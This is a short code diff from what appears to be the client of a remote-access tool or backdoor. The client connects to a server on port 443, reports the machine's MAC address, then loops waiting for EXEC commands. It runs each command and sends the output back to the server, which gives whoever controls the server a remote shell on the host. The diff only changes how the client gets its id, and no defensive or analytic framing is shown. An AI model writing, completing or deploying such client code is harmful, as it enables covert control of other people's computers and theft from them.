@@ -15,6 +15,7 @@ using namespace std;
 #define PORT 443
 
 string MAC;
+int id;
 
 int main(int argc, char** argv) {
 	MAC = getMAC();
@@ -45,15 +46,17 @@ int main(int argc, char** argv) {
 	cout << "Connected!" << endl;
 #endif
 
-	_send(conn, SocketTag::SET_ID, MAC);	// Send id to server
-
 	SocketData packet;
+
+	_recv(conn, packet);	// Send id to server
+	id = string_to_int(packet.data);
+
+	_send(conn, SocketTag::SET_MAC, MAC);
 	
 	while (true) {
 		_recv_wait(conn, packet);
 
 		switch (packet.tag) {
-
 			case SocketTag::EXEC: {
 				string result = exec(packet.data.c_str());
 				_send(conn, SocketTag::EXEC, result);
